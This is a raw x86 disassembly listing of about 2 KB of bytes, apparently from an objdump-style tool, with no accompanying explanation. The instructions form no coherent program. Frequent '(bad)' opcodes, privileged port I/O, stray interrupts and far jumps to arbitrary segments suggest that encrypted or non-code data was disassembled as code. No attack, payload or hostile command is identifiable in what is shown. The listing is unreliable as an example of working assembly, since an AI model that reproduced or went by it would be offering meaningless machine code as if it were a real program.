  41bb33:	rcr    BYTE PTR [esp+ecx*2],cl
  41bb36:	jo     0x41bbb5
  41bb38:	cmp    eax,0x359d0e9
  41bb3d:	push   esp
  41bb3e:	jecxz  0x41bb43
  41bb40:	and    ebx,DWORD PTR [ebx]
  41bb42:	jns    0x41bb2a
  41bb44:	popa   
  41bb45:	push   ecx
  41bb46:	push   edi
  41bb47:	xchg   ebx,eax
  41bb48:	push   edi
  41bb49:	jb     0x41bb39
  41bb4b:	js     0xf6b10eb7
  41bb51:	mov    ch,0x5a
  41bb53:	aas    
  41bb54:	scas   eax,DWORD PTR es:[edi]
  41bb55:	adc    ah,dl
  41bb57:	mov    bl,0xb3
  41bb59:	fnstcw WORD PTR [edx]
  41bb5b:	mov    ecx,0xf98a8f06
  41bb60:	test   eax,0xc96eb438
  41bb65:	mov    al,0x30
  41bb67:	sbb    eax,0xf241d7f
  41bb6c:	fnsave [edi+0x1a]
  41bb6f:	xchg   edx,eax
  41bb70:	xchg   DWORD PTR [edi+0x3d],eax
  41bb73:	ss ret 0x3901
  41bb77:	sbb    eax,0x63d0ecf9
  41bb7c:	jle    0x41bb2d
  41bb7e:	sub    eax,0x9d058bbc
  41bb83:	mov    dl,0x62
  41bb85:	push   ebx
  41bb86:	or     al,0xf4
  41bb88:	cmp    ecx,DWORD PTR [ebp+0x32]
  41bb8b:	cmp    eax,0x27f1eb0b
  41bb90:	fbstp  TBYTE PTR [ebp+0x6]
  41bb93:	jle    0x41bbf4
  41bb95:	jg     0x41bb40
  41bb97:	or     dh,dl
  41bb99:	mov    al,0x5
  41bb9b:	mul    BYTE PTR [edi]
  41bb9d:	nop
  41bb9e:	inc    ebx
  41bb9f:	push   edx
  41bba0:	cwde   
  41bba1:	sub    eax,0x31198087
  41bba6:	push   0x1d
  41bba8:	jmp    0x6da5f5d9
  41bbad:	aaa    
  41bbae:	xchg   esp,eax
  41bbaf:	mov    ecx,0xfbb377c7
  41bbb4:	je     0x41bc27
  41bbb6:	mov    al,ds:0x3fc6c85b
  41bbbb:	xchg   esp,eax
  41bbbc:	push   edi
  41bbbd:	xor    al,0x79
  41bbbf:	ss das 
  41bbc1:	in     eax,dx
  41bbc2:	jb     0x41bb4d
  41bbc4:	sbb    al,0x85
  41bbc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc7:	jge    0x41bc24
  41bbc9:	cli    
  41bbca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbcb:	xor    eax,0x8d9795af
  41bbd0:	in     eax,dx
  41bbd1:	nop
  41bbd2:	push   ecx
  41bbd3:	sbb    eax,0x89b3dcd9
  41bbd8:	inc    esi
  41bbd9:	xchg   edx,eax
  41bbda:	lock jns 0x41bb6d
  41bbdd:	mov    ecx,ss
  41bbdf:	mov    dh,ah
  41bbe1:	popf   
  41bbe2:	dec    ebx
  41bbe3:	adc    BYTE PTR [ebp+0x3d],0x7d
  41bbe7:	pop    ss
  41bbe8:	loope  0x41bc62
  41bbea:	mov    WORD PTR [ebx+0x31fc55e],gs
  41bbf0:	and    edi,edi
  41bbf2:	ret    
  41bbf3:	mov    ds:0x769c4df9,al
  41bbf8:	fidiv  WORD PTR [edx]
  41bbfa:	sub    BYTE PTR [edx],bh
  41bbfc:	stc    
  41bbfd:	test   BYTE PTR [esp+eiz*8],dl
  41bc00:	mov    edi,0xf061a268
  41bc05:	push   ds
  41bc06:	sub    BYTE PTR [esi+0x3dad28cb],dl
  41bc0c:	in     al,dx
  41bc0d:	and    BYTE PTR [edi+eiz*1],bl
  41bc10:	add    cl,al
  41bc12:	sub    ebx,DWORD PTR [ebp-0x3fc4217d]
  41bc18:	pop    edx
  41bc19:	sti    
  41bc1a:	push   edi
  41bc1b:	mov    eax,ds:0xd4ef5c60
  41bc20:	mov    ch,0x5b
  41bc22:	mov    ecx,0x3839e0fc
  41bc27:	(bad)  
  41bc28:	es jne 0x41bbe0
  41bc2b:	xchg   ecx,eax
  41bc2c:	or     ebp,DWORD PTR [edi+0x6]
  41bc2f:	loopne 0x41bc9a
  41bc31:	sahf   
  41bc32:	mov    eax,ds:0x3b6020b9
  41bc37:	in     al,dx
  41bc38:	arpl   WORD PTR [eax-0x2d1546c2],bp
  41bc3e:	repnz sbb ebp,DWORD PTR [ecx+0x7487c876]
  41bc45:	fs pop ebx
  41bc47:	retf   
  41bc48:	mov    esp,0xb0c2521c
  41bc4d:	adc    bl,BYTE PTR [edx]
  41bc4f:	sbb    eax,0x25818f7a
  41bc54:	fs out dx,al
  41bc56:	xchg   ebp,eax
  41bc57:	xchg   DWORD PTR [esi],edi
  41bc59:	dec    ecx
  41bc5a:	leave  
  41bc5b:	test   DWORD PTR [ebx+0x47],esp
  41bc5e:	sub    ah,BYTE PTR [ebp-0x4700ffb5]
  41bc64:	mov    cl,0x74
  41bc66:	mov    cl,0x4d
  41bc68:	das    
  41bc69:	jnp    0x41bca2
  41bc6b:	dec    esi
  41bc6c:	push   cs
  41bc6d:	jae    0x41bcda
  41bc6f:	push   ebp
  41bc70:	gs and eax,0xba24593f
  41bc76:	(bad)  
  41bc77:	(bad)
  41bc7a:	mov    bl,0xf3
  41bc7c:	scas   eax,DWORD PTR es:[edi]
  41bc7d:	out    dx,eax
  41bc7e:	mov    al,ds:0x7d332749
  41bc83:	dec    edi
  41bc84:	pop    edx
  41bc85:	jmp    0x2715d600
  41bc8a:	sub    bl,BYTE PTR [eax]
  41bc8c:	ficom  DWORD PTR [ecx-0x17]
  41bc8f:	mov    ds:0x18c1275b,al
  41bc94:	mov    cl,0x0
  41bc96:	mov    ecx,DWORD PTR [eax]
  41bc98:	fcmovb st,st(2)
  41bc9a:	or     BYTE PTR [eax+0x0],al
  41bc9d:	iret   
  41bc9e:	mov    ecx,0xfb7ce492
  41bca3:	dec    edi
  41bca4:	cli    
  41bca5:	sub    bl,BYTE PTR [ebx]
  41bca7:	int    0xdc
  41bca9:	mov    al,ch
  41bcab:	lahf   
  41bcac:	rcl    ch,0xca
  41bcaf:	jp     0x41bc46
  41bcb1:	pop    ecx
  41bcb2:	push   ebp
  41bcb3:	xor    BYTE PTR [esi],0xbc
  41bcb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb7:	or     BYTE PTR [esi+0x6c],ch
  41bcba:	jns    0x41bc6e
  41bcbc:	cmp    BYTE PTR [edx+0x30],ah
  41bcbf:	xchg   ebp,eax
  41bcc0:	inc    ecx
  41bcc1:	inc    ebx
  41bcc2:	dec    ebx
  41bcc3:	jmp    0x41bd33
  41bcc5:	sbb    BYTE PTR [ebx+edi*8-0x33],dl
  41bcc9:	sar    BYTE PTR [edx+0x4cdc44b8],1
  41bccf:	(bad)  
  41bcd0:	fcomp  DWORD PTR [esi+eiz*1]
  41bcd3:	shl    DWORD PTR [ecx-0x7e],cl
  41bcd6:	or     al,0x3f
  41bcd8:	stos   DWORD PTR es:[edi],eax
  41bcd9:	retf   
  41bcda:	sbb    al,0x49
  41bcdc:	std    
  41bcdd:	data16 (bad) 
  41bcdf:	and    al,0x2b
  41bce1:	xor    edi,DWORD PTR [ecx]
  41bce3:	retf   0x8e9c
  41bce6:	es call 0x9f3fa6f8
  41bcec:	xchg   edi,eax
  41bced:	mov    bl,0xa3
  41bcef:	pop    ebx
  41bcf0:	sub    DWORD PTR [ebx],eax
  41bcf2:	call   0xafa7e7e9
  41bcf7:	(bad)  
  41bcf8:	call   0xdcbb:0x3525b9f3
  41bcff:	add    eax,0xb0b1d8d1
  41bd04:	sub    al,0xef
  41bd06:	dec    ebx
  41bd07:	std    
  41bd08:	js     0x41bd6a
  41bd0a:	int3   
  41bd0b:	push   cs
  41bd0c:	push   ds
  41bd0d:	mov    esi,0x1019057e
  41bd12:	(bad)  
  41bd13:	jmp    DWORD PTR [eax]
  41bd15:	and    edx,DWORD PTR [ebp+0x605cd22a]
  41bd1b:	push   cs
  41bd1c:	aaa    
  41bd1d:	jo     0x41bd7a
  41bd1f:	test   eax,0x8a473ee7
  41bd24:	push   ds
  41bd25:	mov    edx,0x9e6dbc30
  41bd2a:	outs   dx,BYTE PTR ds:[esi]
  41bd2b:	cmp    eax,0xb2f0578c
  41bd30:	loopne 0x41bd89
  41bd32:	pop    es
  41bd33:	shr    BYTE PTR [ecx+0x7c],cl
  41bd36:	sub    ah,BYTE PTR [ecx+0x68]
  41bd39:	shl    BYTE PTR [ecx+0x3c],0xda
  41bd3d:	sbb    al,al
  41bd3f:	push   0x5b
  41bd41:	cmp    eax,0x4ba8dfa7
  41bd46:	(bad)  
  41bd48:	sbb    dl,BYTE PTR [ebx-0x7c525e9d]
  41bd4e:	mov    bh,0x93
  41bd50:	int3   
  41bd51:	push   ebp
  41bd52:	xchg   BYTE PTR [esi-0x3e2e5e22],dl
  41bd58:	fnstsw WORD PTR [ebx]
  41bd5a:	shr    DWORD PTR [ecx+esi*1-0x43],cl
  41bd5e:	js     0x41bd4a
  41bd60:	out    0x12,eax
  41bd62:	(bad)  
  41bd63:	out    0x9b,eax
  41bd65:	dec    ebx
  41bd66:	outs   dx,DWORD PTR ds:[esi]
  41bd67:	enter  0xa849,0xe0
  41bd6b:	push   ds
  41bd6c:	(bad)  
  41bd6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd6e:	jp     0x41bd00
  41bd70:	std    
  41bd71:	enter  0x91e2,0xb9
  41bd75:	int    0x48
  41bd77:	je     0x41bddb
  41bd79:	dec    eax
  41bd7a:	inc    edi
  41bd7b:	cmp    ecx,DWORD PTR [ebp-0xa]
  41bd7e:	xchg   esp,eax
  41bd7f:	gs iret 
  41bd81:	jno    0x41bd9a
  41bd83:	(bad)  
  41bd84:	cli    
  41bd85:	xchg   edi,eax
  41bd86:	mov    BYTE PTR [ebp+0x52],dh
  41bd89:	imul   ebp,DWORD PTR [esi],0xffffff81
  41bd8c:	out    0x11,eax
  41bd8e:	inc    ebx
  41bd8f:	outs   dx,BYTE PTR ds:[esi]
  41bd90:	mov    ds:0xfc99917c,eax
  41bd95:	loope  0x41bd47
  41bd97:	push   ecx
  41bd98:	adc    bh,cl
  41bd9a:	mov    ebx,0x99bd6321
  41bd9f:	jno    0x41bd68
  41bda1:	xchg   ebp,eax
  41bda2:	or     BYTE PTR [edx],bl
  41bda4:	stos   DWORD PTR es:[edi],eax
  41bda5:	inc    edx
  41bda6:	sub    DWORD PTR [esi+0x3],ecx
  41bda9:	mov    ch,0xaa
  41bdab:	jb     0x41bdcd
  41bdad:	aas    
  41bdae:	sbb    al,0xa3
  41bdb0:	ja     0x41bd89
  41bdb2:	cmp    ch,BYTE PTR [ebx-0x6d]
  41bdb5:	jle    0x41bd6e
  41bdb7:	jp     0x41bd6a
  41bdb9:	mov    eax,ds:0x1eb99179
  41bdbe:	pop    ecx
  41bdbf:	imul   dh
  41bdc1:	aad    0xed
  41bdc3:	out    0x51,al
  41bdc5:	stos   DWORD PTR es:[edi],eax
  41bdc6:	test   bh,dl
  41bdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc9:	cli    
  41bdca:	xchg   edx,esi
  41bdcc:	push   esp
  41bdcd:	jae    0x41bd51
  41bdcf:	test   eax,0x73da8c12
  41bdd4:	fs cmc 
  41bdd6:	retf   0x9e8e
  41bdd9:	push   eax
  41bdda:	pop    ss
  41bddb:	loope  0x41bdb7
  41bddd:	dec    esi
  41bdde:	inc    eax
  41bddf:	cmp    DWORD PTR [ecx-0x328a165a],ebx
  41bde5:	cmc    
  41bde6:	push   esi
  41bde7:	mov    ds:0x2a16e727,eax
  41bdec:	sbb    dh,ah
  41bdee:	loopne 0x41bde2
  41bdf0:	hlt    
  41bdf1:	sahf   
  41bdf2:	cmp    edi,DWORD PTR [edi-0x14]
  41bdf5:	fidiv  WORD PTR [ebx+ebp*2]
  41bdf8:	test   DWORD PTR [edi],esp
  41bdfa:	mov    eax,0x71c7f56c
  41bdff:	rol    BYTE PTR [edx],1
  41be01:	lds    esp,FWORD PTR [edx]
  41be03:	push   0x870ca4fe
  41be08:	stos   BYTE PTR es:[edi],al
  41be09:	dec    esp
  41be0a:	out    0xf0,eax
  41be0c:	int    0x39
  41be0e:	mov    esi,0x8645de7c
  41be13:	push   ss
  41be14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be15:	push   eax
  41be16:	int    0x1d
  41be18:	mov    dh,0x13
  41be1a:	xchg   esi,eax
  41be1b:	(bad)  
  41be1c:	and    al,BYTE PTR [ecx-0x61996d0e]
  41be22:	sub    dh,ch
  41be24:	inc    ebp
  41be25:	clc    
  41be26:	lods   eax,DWORD PTR ds:[esi]
  41be27:	out    dx,al
  41be28:	pop    ds
  41be29:	sub    dh,BYTE PTR ds:0xcfda8a6a
  41be2f:	ins    BYTE PTR es:[edi],dx
  41be30:	test   BYTE PTR [eax+ebp*4],dl
  41be33:	ss leave 
  41be35:	inc    esi
  41be36:	inc    edi
  41be37:	std    
  41be38:	out    dx,al
  41be39:	pop    ebp
  41be3a:	bound  ebp,QWORD PTR [ecx+0x50]
  41be3d:	dec    ebx
  41be3e:	ins    BYTE PTR es:[edi],dx
  41be3f:	cmp    DWORD PTR [ecx+0x78f1e953],esp
  41be45:	inc    eax
  41be46:	test   DWORD PTR [edx],ecx
  41be48:	and    edi,DWORD PTR [edi+edi*8+0x1bf7eb59]
  41be4f:	jbe    0x41be66
  41be51:	dec    edx
  41be52:	lods   al,BYTE PTR ds:[esi]
  41be53:	sbb    BYTE PTR [ebp+0x26a9f273],al
  41be59:	cmp    bl,BYTE PTR [ebx]
  41be5b:	jne    0x41beae
  41be5d:	jo     0x41be7f
  41be5f:	or     eax,0x7ad89444
  41be64:	xor    bl,dl
  41be66:	mov    DWORD PTR [esp+eiz*8],eax
  41be69:	das    
  41be6a:	call   0xec65:0x1058760
  41be71:	inc    esp
  41be72:	xor    al,0xa2
  41be74:	iret   
  41be75:	sahf   
  41be76:	sub    eax,0x25673934
  41be7b:	or     al,0x47
  41be7d:	sbb    eax,0x163a8b4a
  41be82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be83:	mov    eax,ds:0x32f0c0a4
  41be88:	mov    edx,0x32ce00f5
  41be8d:	and    esi,0x512f9657
  41be93:	mov    eax,ds:0x97c1576
  41be98:	dec    ecx
  41be99:	out    dx,eax
  41be9a:	jae    0x41be2d
  41be9c:	aas    
  41be9d:	mov    edi,esi
  41be9f:	sbb    BYTE PTR [edi],al
  41bea1:	adc    al,0xb7
  41bea3:	pandn  mm1,QWORD PTR es:[esi+0x2de4b0b6]
  41beab:	neg    DWORD PTR [edi]
  41bead:	loopne 0x41be86
  41beaf:	adc    ch,bh
  41beb1:	dec    esp
  41beb2:	out    dx,al
  41beb3:	(bad)  
  41beb4:	sub    DWORD PTR [ecx+0x1a472968],edi
  41beba:	pop    ebx
  41bebb:	in     al,dx
  41bebc:	jbe    0x41be8c
  41bebe:	mov    ecx,0xf7711702
  41bec3:	xchg   ebx,eax
  41bec4:	dec    esp
  41bec5:	pop    esi
  41bec6:	js     0x41bed7
  41bec8:	je     0x41bf35
  41beca:	pop    ebx
  41becb:	imul   DWORD PTR [eax+esi*1]
  41bece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41becf:	call   0x78d1ccc7
  41bed4:	iret   
  41bed5:	mov    ds:0x54c11d0,al
  41beda:	sub    eax,0x61184e41
  41bedf:	arpl   WORD PTR [edx+0x1eb18e72],sp
  41bee5:	push   ebp
  41bee6:	outs   dx,BYTE PTR ds:[esi]
  41bee7:	pop    eax
  41bee8:	enter  0xdd94,0xb8
  41beec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beed:	popf   
  41beee:	rcr    BYTE PTR [ecx],0xa3
  41bef1:	fadd   QWORD PTR [ebx-0x52f7e36e]
  41bef7:	mov    ds:0xacc0b6ea,eax
  41befc:	jg     0x41beef
  41befe:	add    al,0x56
  41bf00:	add    DWORD PTR [esi-0x2caede24],edx
  41bf06:	icebp  
  41bf07:	imul   ebp,DWORD PTR [edx+0x3fd6a901],0xffffffcc
  41bf0e:	dec    ebp
  41bf0f:	retf   0xf733
  41bf12:	into   
  41bf13:	stos   BYTE PTR es:[edi],al
  41bf14:	pop    edi
  41bf15:	nop
  41bf16:	mov    ch,0x99
  41bf18:	test   DWORD PTR [eax],ecx
  41bf1a:	dec    edx
  41bf1b:	div    dl
  41bf1d:	les    ebx,FWORD PTR [edi+0x1b]
  41bf20:	out    0x5a,al
  41bf22:	fst    DWORD PTR [edx+0x59]
  41bf25:	and    eax,0x4dc51357
  41bf2a:	bnd jnp 0x41bf0e
  41bf2d:	cmp    BYTE PTR [ebp+ebx*1-0x512d7320],ah
  41bf34:	sub    DWORD PTR [eax],edx
  41bf36:	push   edi
  41bf37:	nop
  41bf38:	icebp  
  41bf39:	stc    
  41bf3a:	jecxz  0x41bf79
  41bf3c:	push   es
  41bf3d:	mov    ch,0x40
  41bf3f:	bound  ecx,QWORD PTR [ecx+0x46e5068e]
  41bf45:	push   cs
  41bf46:	pop    eax
  41bf47:	jae    0x41bee6
  41bf49:	sbb    eax,esp
  41bf4b:	dec    edi
  41bf4c:	jno    0x41bfa0
  41bf4e:	and    al,0x68
  41bf50:	adc    BYTE PTR [ebx],cl
  41bf52:	inc    ebx
  41bf53:	dec    ebp
  41bf54:	outs   dx,BYTE PTR ds:[esi]
  41bf55:	rcr    DWORD PTR [edi],cl
  41bf57:	call   0xc9e5:0xc23c1a0b
  41bf5e:	sbb    edx,DWORD PTR [ecx+eax*8]
  41bf61:	sub    BYTE PTR [edi+0x7b],0x88
  41bf65:	dec    esi
  41bf66:	cdq    
  41bf67:	pop    ss
  41bf68:	or     eax,esi
  41bf6a:	and    BYTE PTR [ecx-0x64],dl
  41bf6d:	jns    0x41bf15
  41bf6f:	fist   DWORD PTR [ecx-0x58]
  41bf72:	fidivr DWORD PTR [ebx-0x73]
  41bf75:	mov    ah,0xf0
  41bf77:	and    bh,BYTE PTR [ebx+0x4ae85a28]
  41bf7d:	out    dx,eax
  41bf7e:	mov    ecx,0x5e048a48
  41bf83:	pop    dx
  41bf85:	nop
  41bf86:	sub    DWORD PTR [esi+0x2f],0xc153d1c3
  41bf8d:	pop    esp
  41bf8e:	addr16 jl 0x41c009
  41bf91:	hlt    
  41bf92:	ins    DWORD PTR es:[edi],dx
  41bf93:	outs   dx,BYTE PTR ds:[esi]
  41bf94:	aad    0xe0
  41bf96:	dec    ebx
  41bf97:	pop    esi
  41bf98:	in     eax,dx
  41bf99:	and    ah,BYTE PTR [ebx]
  41bf9b:	lds    ecx,FWORD PTR [edi-0x437c6adf]
  41bfa1:	jae    0x41bf37
  41bfa3:	out    0x8f,al
  41bfa5:	push   ds
  41bfa6:	inc    eax
  41bfa7:	jae    0x41bf3c
  41bfa9:	push   edi
  41bfaa:	fild   DWORD PTR [ebx-0x3707f38c]
  41bfb0:	call   FWORD PTR [eax-0x4a]
  41bfb3:	dec    ebp
  41bfb4:	mov    cl,0xb9
  41bfb6:	sbb    eax,0x2d2a2f40
  41bfbb:	imul   esi,DWORD PTR [ebx-0x35],0xed3c9bf2
  41bfc2:	adc    dl,BYTE PTR [ebx]
  41bfc4:	test   BYTE PTR [edx-0x77],cl
  41bfc7:	jle    0x41bf7d
  41bfc9:	into   
  41bfca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfcb:	sub    esp,ecx
  41bfcd:	dec    ebx
  41bfce:	xchg   esi,eax
  41bfcf:	fcomp  DWORD PTR [ecx+edi*8+0x4c1a4565]
  41bfd6:	fmul   QWORD PTR [ecx+0x3d7e19a0]
  41bfdc:	in     eax,0xfa
  41bfde:	mov    ch,bl
  41bfe0:	es fmul st(3),st
  41bfe3:	pusha  
  41bfe4:	pop    esi
  41bfe5:	aaa    
  41bfe6:	xchg   edi,eax
  41bfe7:	mov    bh,0x67
  41bfe9:	jo     0x41bfa2
  41bfeb:	(bad)  
  41bfec:	rcr    DWORD PTR [eax-0x33],1
  41bfef:	jo     0x41c068
  41bff1:	dec    ebx
  41bff2:	mov    cs,WORD PTR [ebx]
  41bff4:	cld    
  41bff5:	cmovs  ebp,DWORD PTR [eax-0x8]
  41bff9:	fiadd  DWORD PTR [esi+ecx*2-0x13c75bc4]
  41c000:	and    al,0xf5
  41c002:	mov    ds:0x8434d6a7,eax
  41c007:	or     BYTE PTR [esi+0x24],al
  41c00a:	lods   eax,DWORD PTR ds:[esi]
  41c00b:	sbb    edx,DWORD PTR [ebx]
  41c00d:	or     DWORD PTR [esi-0x611f0a87],edx
  41c013:	dec    ebx
  41c014:	pop    ecx
  41c015:	in     eax,0x14
  41c017:	jns    0x41c079
  41c019:	or     al,0x13
  41c01b:	nop
  41c01c:	adc    BYTE PTR [ecx+eiz*2+0x2c],0x7e
  41c021:	xor    al,0x66
  41c023:	and    dl,BYTE PTR [ecx+0x73]
  41c026:	jmp    0x23db:0x5da83611
  41c02d:	xlat   BYTE PTR ds:[ebx]
  41c02e:	addr16 mov al,0xc5
  41c031:	push   ss
  41c032:	xchg   ebp,eax
  41c033:	dec    esp
  41c034:	nop
  41c035:	(bad)  
  41c036:	adc    dl,BYTE PTR [edx]
  41c038:	or     ebp,DWORD PTR [esi]
  41c03a:	fistp  WORD PTR [edi+0x4169f722]
  41c040:	xor    BYTE PTR [ebx],dh
  41c042:	mov    bl,0x1c
  41c044:	inc    ecx
  41c045:	adc    al,0x4
  41c047:	push   ecx
  41c048:	mov    bl,0x44
  41c04a:	or     dh,dl
  41c04c:	rcr    BYTE PTR [eax],1
  41c04e:	outs   dx,DWORD PTR ds:[esi]
  41c04f:	popf   
  41c050:	fcmove st,st(7)
  41c052:	pop    esp
  41c053:	adc    DWORD PTR [edx-0x79],0xffffffb5
  41c057:	mov    ?,WORD PTR ds:0x55b5b04c
  41c05d:	jp     0x41c01e
  41c05f:	cmp    al,0x7
  41c061:	mov    bl,BYTE PTR ds:0xfdb7a834
  41c067:	lds    edx,FWORD PTR [ebp-0xc0b1e15]
  41c06d:	mov    ds:0x946026b1,al
  41c072:	in     eax,dx
  41c073:	or     dh,al
  41c075:	pop    ebp
  41c076:	(bad)  
  41c077:	ins    BYTE PTR es:[edi],dx
  41c078:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41c07a:	jmp    0x3aff:0xf23f0bd8
  41c081:	sbb    DWORD PTR [esi+0x5854fbe1],ebp
  41c087:	cmp    BYTE PTR [esp+ebp*4],al
  41c08a:	js     0x41c069
  41c08c:	scas   eax,DWORD PTR es:[edi]
  41c08d:	mov    bl,0x8
  41c08f:	hlt    
  41c090:	loope  0x41c0ec
  41c092:	cmp    eax,0xae36f789
  41c097:	iret   
  41c098:	shr    BYTE PTR [edi+0x78],0x70
  41c09c:	pop    ebp
  41c09d:	sbb    dh,BYTE PTR [edx]
  41c09f:	push   ebp
  41c0a0:	aas    
  41c0a1:	loop   0x41c07a
  41c0a3:	fisttp WORD PTR [eax+0x69]
  41c0a6:	mov    ecx,0x36c34f57
  41c0ab:	mov    ecx,0x46aa01bb
  41c0b0:	loopne 0x41c0b3
  41c0b2:	xchg   ebx,eax
  41c0b3:	or     DWORD PTR [ecx-0x25],edi
  41c0b6:	sbb    DWORD PTR [eax],edi
  41c0b8:	ret    0x42f9
  41c0bb:	pop    edi
  41c0bc:	imul   esp,eax,0xffffffda
  41c0bf:	stc    
  41c0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c1:	dec    ebx
  41c0c2:	(bad)  
  41c0c3:	jns    0x41c127
  41c0c5:	xor    BYTE PTR [edx],0xbc
  41c0c8:	or     DWORD PTR [ebx-0x14],esp
  41c0cb:	jmp    0x87491f83
  41c0d0:	cmc    
  41c0d1:	xchg   ebx,eax
  41c0d2:	adc    al,0x7c
  41c0d4:	pop    ebp
  41c0d5:	fs out dx,al
  41c0d7:	cld    
  41c0d8:	mov    dl,0xb6
  41c0da:	inc    esp
  41c0db:	mov    BYTE PTR [esi+0x4a],bh
  41c0de:	arpl   WORD PTR [edx],bp
  41c0e0:	add    cl,ch
  41c0e2:	pop    ebp
  41c0e3:	test   BYTE PTR [esi+0x2b],0x4a
  41c0e7:	stos   DWORD PTR es:[edi],eax
  41c0e8:	push   ebp
  41c0e9:	xor    BYTE PTR [edx-0x259cfd38],bl
  41c0ef:	clc    
  41c0f0:	out    dx,al
  41c0f1:	popa   
  41c0f2:	push   cs
  41c0f3:	fwait
  41c0f4:	shl    DWORD PTR [edx],1
  41c0f6:	(bad)  
  41c0f7:	out    0xf8,al
  41c0f9:	arpl   WORD PTR [eax-0x6372b51b],si
  41c0ff:	ret    
  41c100:	jmp    0xc935:0x5bf5306a
  41c107:	test   DWORD PTR [eax+0x188fdf31],eax
  41c10d:	cwde   
  41c10e:	in     eax,0x69
  41c110:	ret    0xa07a
  41c113:	(bad)  
  41c114:	dec    esi
  41c115:	cmc    
  41c116:	xchg   DWORD PTR [edx-0x1e69276],ebx
  41c11c:	into   
  41c11d:	or     BYTE PTR [ebp-0x1f94eaa1],cl
  41c123:	mov    DWORD PTR ds:0x26ee4147,ebp
  41c129:	pop    edx
  41c12a:	mov    bh,0x45
  41c12c:	cld    
  41c12d:	mov    ds:0x1e0b1826,eax
  41c132:	and    al,0xdd
  41c134:	cmp    eax,0xc43f06e2
  41c139:	jecxz  0x41c113
  41c13b:	xor    BYTE PTR [edx-0x6a0e1270],bl
  41c141:	mov    bl,0x43
  41c143:	mov    ebx,0xdd9080ed
  41c148:	and    eax,0x374b631a
  41c14d:	pop    edx
  41c14e:	je     0x41c1a5
  41c150:	or     ah,BYTE PTR [eax+0x7f66ffa6]
  41c156:	add    al,0xc1
  41c158:	not    BYTE PTR [ecx]
  41c15a:	jmp    0x5f961cd3
  41c15f:	jg     0x41c14c
  41c161:	lock sub eax,0xbad77e7a
  41c167:	push   DWORD PTR [edi]
  41c169:	add    DWORD PTR [eax],ebp
  41c16b:	fmul   QWORD PTR [esi]
  41c16d:	xchg   edx,eax
  41c16e:	dec    ecx
  41c16f:	test   eax,0xf8d92e99
  41c174:	popf   
  41c175:	mov    dh,0xab
  41c177:	stc    
  41c178:	out    dx,al
  41c179:	mov    edx,0x99384d91
  41c17e:	je     0x41c14c
  41c180:	mov    cl,0xf1
  41c182:	cli    
  41c183:	inc    ebp
  41c184:	icebp  
  41c185:	mov    ch,0x9b
  41c187:	push   eax
  41c188:	sti    
  41c189:	jnp    0x41c191
  41c18b:	pop    ebx
  41c18c:	fsincos 
  41c18e:	out    dx,al
  41c18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c190:	js     0x41c199
  41c192:	xor    DWORD PTR [edx],ebx
  41c194:	mov    cl,0xde
  41c196:	mov    ecx,0xb061e77e
  41c19b:	outs   dx,DWORD PTR ds:[esi]
  41c19c:	mov    dl,0x3d
  41c19e:	sbb    BYTE PTR ds:[esi+0x336d11db],dl
  41c1a5:	cli    
  41c1a6:	xor    BYTE PTR [edx-0x77],bh
  41c1a9:	test   al,0x10
  41c1ab:	jb     0x41c1fa
  41c1ad:	lahf   
  41c1ae:	push   esp
  41c1af:	add    BYTE PTR [ebx],dl
  41c1b1:	popf   
  41c1b2:	mov    edi,0xe172f3ca
  41c1b7:	call   0xa6cc:0x9a6c7599
  41c1be:	je     0x41c217
  41c1c0:	cmp    BYTE PTR [esi+edi*4+0x36],bl
  41c1c4:	scas   eax,DWORD PTR es:[edi]
  41c1c5:	pop    ebx
  41c1c6:	add    eax,0xfede4ad8
  41c1cb:	enter  0x2970,0x90
  41c1cf:	ins    DWORD PTR es:[edi],dx
  41c1d0:	push   es
  41c1d1:	mov    ds:0x308abbf9,eax
  41c1d6:	cdq    
  41c1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1d8:	cmc    
  41c1d9:	es inc ebp
  41c1db:	push   esi
  41c1dc:	lds    esp,FWORD PTR [edx+0x3d]
  41c1df:	aad    0xca
  41c1e1:	pop    ebx
  41c1e2:	mov    dh,0xb2
  41c1e4:	sub    DWORD PTR [eax-0x4d],edx
  41c1e7:	dec    eax
  41c1e8:	cmp    DWORD PTR [ebx-0x368cd4e6],0x6f
  41c1ef:	xchg   edi,eax
  41c1f0:	test   ch,dl
  41c1f2:	nop
  41c1f3:	adc    ah,BYTE PTR [ebp+ecx*8+0x62]
  41c1f7:	into   
  41c1f8:	inc    eax
  41c1f9:	cwde   
  41c1fa:	add    al,0xc
  41c1fc:	sbb    eax,DWORD PTR [ebp+0x10]
  41c1ff:	jmp    0xa6932af
  41c204:	inc    eax
  41c205:	mov    cl,0xb9
  41c207:	jbe    0x41c1ec
  41c209:	inc    esp
  41c20a:	inc    ecx
  41c20b:	or     DWORD PTR [edi+0x753370f0],edx
  41c211:	push   esi
  41c212:	fisub  WORD PTR [eax]
  41c214:	mov    cl,0x19
  41c216:	dec    edi
  41c217:	iret   
  41c218:	fidivr WORD PTR [edi+esi*4+0x282c1ba1]
  41c21f:	retf   0x5673
  41c222:	repz push esp
  41c224:	test   al,0x4e
  41c226:	or     edx,DWORD PTR [ecx]
  41c228:	mov    al,0x9d
  41c22a:	test   BYTE PTR [eax],bh
  41c22c:	out    dx,al
  41c22d:	mov    eax,0x3df78d28
  41c232:	jo     0x41c27f
  41c234:	pinsrw mm0,ecx,0x9c
  41c238:	ret    
  41c239:	outs   dx,DWORD PTR ds:[esi]
  41c23a:	jge    0x41c20c
  41c23c:	in     eax,dx
  41c23d:	mov    ah,0xe8
  41c23f:	push   ss
  41c240:	pop    edi
  41c241:	jg     0x41c1f6
  41c243:	fst    QWORD PTR [eax-0x7fb015ea]
  41c249:	sub    bh,al
